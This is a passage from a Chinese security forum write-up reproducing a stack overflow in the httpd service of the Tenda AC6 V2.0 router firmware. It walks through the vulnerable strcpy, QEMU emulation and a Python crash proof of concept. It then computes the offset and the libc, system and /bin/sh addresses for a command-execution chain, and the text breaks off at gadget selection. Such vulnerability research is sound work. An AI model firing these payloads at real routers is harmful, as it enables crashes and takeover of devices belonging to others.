---
title: CNVD-2025-18743-Tenda-AC6V2.0_V15.03.06.23栈溢出漏洞复现
url: https://forum.butian.net/share/4541
source: 奇安信攻防社区
date: 2025-09-19
fetch_date: 2025-10-02T20:21:12.054352
---

# CNVD-2025-18743-Tenda-AC6V2.0_V15.03.06.23栈溢出漏洞复现

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### CNVD-2025-18743-Tenda-AC6V2.0\_V15.03.06.23栈溢出漏洞复现

* [漏洞分析](https://forum.butian.net/topic/48)

本文主要讲解MIPS架构下AC6的栈溢出漏洞利用复现

一、漏洞简介
------
Tenda AC6是一款无线路由器。 Tenda AC6存在二进制漏洞，攻击者可利用该漏洞导致拒绝服务，除此外，进行深度漏洞利用可以实现命令执行效果
二、影响版本
------
V2.0\\_V15.03.06.23
三、漏洞原理分析
--------
漏洞点位发生在websFormDefine("setMacFilterCfg", (void (\\*)(webs\\_t, char\\_t \\*, char\\_t \\*))formSetMacFilterCfg);
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750931057825-35187019-f1b3-4e19-950d-9af7fa53bb6f.png)
跟进formSetMacFilterCfg函数，发现web传参macFilterType、deviceList，首先经过set\\_macfilter\\_mode(mac\\_filter\\_mode) 函数进行判断
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750931949380-e7bb38de-a454-4453-8878-a42138fc7309.png)
跟进set\\_macfilter\\_mode函数，发现此处判断传入的mac\\_filter\\_mode参数是不是white或者black
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750988260798-14c634a1-74e1-46ec-b4c1-f08cdfe3ad04.png)
返回上一层，而后进行error\\_code判断，只有mac\\_filter\\_mode是white或者black的时候，才会经过set\\_macfilter\\_rules(mac\\_filter\\_mode, rule\\_list)函数
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750988330414-c4b405ed-307a-4f3c-8960-5bb472fb6007.png)
跟进set\\_macfilter\\_rules函数，发现此处主要有set\\_macfilter\\_rules\\_by\\_one函数
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750931571399-8d9172d6-6e78-4135-88f6-1422cbac4064.png)
所以继续跟进set\\_macfilter\\_rules\\_by\\_one函数，发现这里面套了个parse\\_macfilter\\_rule(source\\_rule, &amp;rule\\_info)函数，而source\\_rule这个参数实际上就是deviceList
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750931707610-ee16ab27-b538-4a16-ae0d-bbaa5edf6937.png)
持续跟进一下parse\\_macfilter\\_rule函数，发现strcpy(dest\\_rule-&gt;name, source\\_rule)，但是在这之前还有个rule\\_tmp = strchr(source\\_rule, 13);判断，其实就是“\\r”，也就是说，只有传入的参数包含“\\r”才行
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750931738413-5fa6e3d1-b9df-4172-9df5-a8f6b8a103d3.png)
四、环境搭建
------
环境搭建并不复杂，本次依然使用用户级模拟启动(file busybox 查看架构为LSB-MIPS架构，这里就不放图了)
首先是模拟一个网卡，因为tenda AC6的网卡名字与其他常见的系列是一样的，所以脚本在网上随便找一个就能用，具体分析的话，由于本文本身就很长了，所以会在后面找一个较短的篇幅的分析一下
```bash
#!/bin/bash
#我的宿主机的上网的网卡为ens33，并且存在多个虚拟网卡
sudo ifconfig ens33 down # 首先关闭宿主机网卡接口
sudo brctl addbr br0 # 添加一座名为 br0 的网桥
sudo brctl addif br0 ens33 # 在 br0 中添加一个接口
sudo brctl stp br0 on #打开生成树协议
sudo brctl setfd br0 2 # 设置 br0 的转发延迟
sudo brctl sethello br0 1 # 设置 br0 的 hello 时间
sudo ifconfig br0 0.0.0.0 promisc up # 启用 br0 接口
sudo ifconfig ens33 0.0.0.0 promisc up # 启用网卡接口
sudo dhclient br0 # 从 dhcp 服务器获得 br0 的 IP 地址
sudo brctl show br0 # 查看虚拟网桥列表
sudo brctl showstp br0 # 查看 br0 的各接口信息
sudo tunctl -t tap0 # 创建一个 tap0 接口
sudo brctl addif br0 tap0 # 在虚拟网桥中增加一个 tap0 接口
sudo ifconfig tap0 0.0.0.0 promisc up # 启用 tap0 接口
sudo ifconfig tap0 192.168.50.12/24 up #为tap0分配ip地址
sudo ifconfig ens33 192.168.50.10/24 up #为tap0分配ip地址
sudo brctl showstp br0 # 显示 br0 的各个接口
```
执行完网卡脚本后，解压固件
```bash
binwalk -Me US\_AC6V2.0RTL\_V15.03.06.51\_multi\_TDE01.bin
```
进入到固件解压后的文件夹，移除webroot文件夹，而后重构这个文件夹，不然启动后wen页面是异常的
```bash
rm -rf webroot
mkdir webroot
cp -rf ./webroot\_ro/\* ./webroot/
cp $(which qemu-mipsel-static) qemu-mipsel-static
sudo chroot ./ ./qemu-mipsel-static ./bin/httpd
```
这个时候，启动发生异常了
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-0303c67ea16a8bbf1fb6a28f1eaf4d8dea70e5ce.png)
接下来是patch，patch网上也有成熟的教程了，这些估计基本上patch的位置很类似，只不过arm架构的和mips的架构patch的点位略有不同
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750919765189-79a2f388-835e-488e-b763-b02a6b7c479a.png)
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750919832117-30d0e190-ea77-4827-9b02-0015c27f3c89.png)
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750920237815-b824ec68-dcb3-49c1-9d67-6923e94b26b6.png)
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750920276555-70cbc0ce-1203-482f-ad76-e1ba2310b525.png)
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750920343648-c885e94e-dbd8-4e4d-8db0-ed6a410bf7f8.png)
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750920594292-6e549654-d3b5-4c63-a957-96110e14f663.png)
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750920735806-9a9a0f9f-50b0-48e8-a785-bdc0f8137e7c.png)
一套不解释连招，再重新启动，就算是起来了。
对了这里提一句，用户级模拟启动的好处就是，局域网内其他机器也可以访问模拟出来的固件web环境，但是系统级模拟只有这个机器自己能访问web环境
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750989300290-5556096e-18a8-4a0f-85ef-70482745b7ff.png)
五、漏洞复现
------
由于我们上面已经分析了漏洞原因，也看到了传入的接口以及参数，所以直接构造如下poc进行发包测试
测试poc如下
```php
import requests
from pwn import \*
url = "http://192.168.50.18/goform/setMacFilterCfg"
cookie = {"Cookie":"password=1111"}
payload = cyclic(500)
data = {"macFilterType": "white", "deviceList":b"\r" + payload }
requests.post(url, cookies=cookie, data=data)
requests.post(url, cookies=cookie, data=data)
```
测试效果如下，出现段错误异常，程序溢出崩溃
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750989064361-bb31264e-98d7-4d68-9ccf-5317db531841.png)
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750989330821-7e8c077a-d5ed-4fa8-bba9-495b58855eb3.png)
### 偏移量计算
```php
#第一个端
sudo chroot ./ ./qemu-mipsel-static -g 1234 ./bin/httpd
#第二个端
gdb-multiarch
file ./bin/httpd #需要加载httpd文件，请根据实际情况修改
target remote :1234
c
#第三个端
python3 poc.py
```
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750989541440-8d29e317-e07a-4acb-89a7-0c1e540f5ad9.png)
执行cyclic -l taae 得到476，但是这个476其实是包含了返回地址的4个字符
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750989608348-2beb4bc1-7c0e-470d-bfd7-cebea8aaf235.png)
将poc修改
```php
import requests
from pwn import \*
url = "http://192.168.50.18/goform/setMacFilterCfg"
cookie = {"Cookie":"password=1111"}
payload = cyclic(476)
data = {"macFilterType": "white", "deviceList":b"\r" + payload }
requests.post(url, cookies=cookie, data=data)
requests.post(url, cookies=cookie, data=data)
```
重新重复上述步骤
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750989689753-24a6e1b0-c7fe-410a-8299-8b85e3f3b85a.png)
可以看到，PC寄存器此时被覆盖，证实了我们的推测，实际的偏移量为472
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750989732938-126bfb71-1acf-42ec-8a26-ea80b6cad6f2.png)
### libc基址计算
还是先在httpd文件里的strcpy断点，直接用当前这个溢出点位strcpy就行
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750990129926-3e84ddd6-1dec-4f6b-af95-13a1173778b9.png)
```php
#第一个端
sudo chroot ./ ./qemu-mipsel-static -g 1234 ./bin/httpd
#第二个端
gdb-multiarch
file ./bin/httpd #需要加载httpd文件，请根据实际情况修改
target remote :1234
b \*0x4E6A24
c
#第三个端
python3 poc.py
```
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750990210094-ffa1cff4-7d19-4e2c-b65e-4a5ca9fc36ed.png)
记住当前strcpy寄存器的地址为0x3fd62220
而后运行下述代码，查看libc.so.0里面的strcpy相对偏移量
```php
mipsel-linux-gnu-readelf -s ./lib/libc.so.0 | grep strcpy
```
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750990287875-94eaabeb-eb87-4e80-9e96-b3a1fd63e26d.png)
所以可以得到libc基址地址为
```php
libc\_base = 0x3fd62220 - 0x0003d220 = 0x3FD25000
```
### \*\*system基址计算\*\*
执行下述指令，获取system在libc中的相对偏移量0x00060320
mipsel-linux-gnu-readelf -s ./lib/libc.so.0|grep system
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750990686267-6d76c92b-14d4-409d-ac09-c47d06fd3b89.png)
所以system\\_base 如下
```php
system\_addr = libc\_base + 0x00060320
```
### \*\*/bin/sh 计算\*\*
/bin/sh 我直接按照上述搜索没有搜到，所以我使用ida打开找的地址为 0x6AE30
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750991244897-d7991d3a-bd3a-44a9-8123-714a666819ee.png)
所以binsh\\_base 如下
```php
binsh\_addr = libc\_base + 0x6AE30
```
### gadget1选择
![](https://cdn.nlark.com/yuque/0/2025/png/23044343/1750991916935-63465794-424...